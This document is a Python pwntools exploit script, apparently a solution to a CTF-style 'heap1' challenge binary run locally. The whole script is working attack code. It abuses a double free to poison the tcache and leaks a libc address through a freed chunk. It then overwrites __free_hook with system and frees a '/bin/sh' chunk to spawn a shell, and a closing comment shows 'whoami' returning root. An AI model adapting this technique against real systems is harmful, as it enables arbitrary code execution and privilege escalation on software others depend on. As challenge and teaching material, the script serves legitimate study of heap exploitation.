# Gabriel Corella heap1 exploit
from pwn import * 
binary_name = "./heap1"

def malloc(indx, size, payload):
    global r
    r.sendlineafter(b"\n> ","1")
    r.sendlineafter(b"Index: \n",str(indx))
    r.sendlineafter(b"Size: \n",str(size))
    r.sendlineafter(b"Data\n",payload)

def free(indx):
    global r
    r.sendlineafter(b"\n> ","3")
    r.sendlineafter(b"Index\n",str(indx))

def show(indx):
	global r
	r.sendlineafter(b"\n> ","2")
	r.sendlineafter(b"Index\n",str(indx))
	return r.recvuntil("1. ")

elf = ELF(binary_name)
r = process(binary_name)
libc = elf.libc
#menu
print(r.recv())

r.sendline()

malloc(0, 0x638, "AAAABBBBCCCCDDDD")
free(0)
#double free change to 2.27 on kali 
malloc(0, 0x38, "AAAABBBBCCCCDDDD")
malloc(1, 0x38, "AAAABBBBCCCCDDDD")
free(1)
free(0)


malloc(2, 0x638, "GABEGABEGABEGABE")
malloc(3, 0x638, "GABEGABEGABEGABE")
free(2)
leak1 = show(2)
leak1 = u64(leak1[:leak1.find(b"1.")].ljust(8,b"\x00"))
print("Leak1: ", leak1)
#attach using gdb and get the beginning of the 
libc.address = leak1-4111520

print(libc.address)

print(hex(libc.sym["__free_hook"]))
print("System address", hex(libc.sym["system"]))

malloc(4, 56, "caniwinplease")

free(4)
free(4)
# perform another write what where with the addresses of free_hook and system to launch a shell
malloc(4, 0x38, p64(libc.sym.__free_hook))
malloc(4, 0x38, p64(libc.sym.__free_hook))

malloc(5, 0x38, p64(libc.sym.system))
# Size doesnt have to be that big, only need to write to bin/sh\x00
malloc(6, 0x18,b"/bin/sh\x00")
free(6)

r.interactive()

@atexception.register
def handler():
    log.error(r.recv())
with context.local(log_level = 'error'):
    atexception.register(handler)

'''

$: whoami
root

'''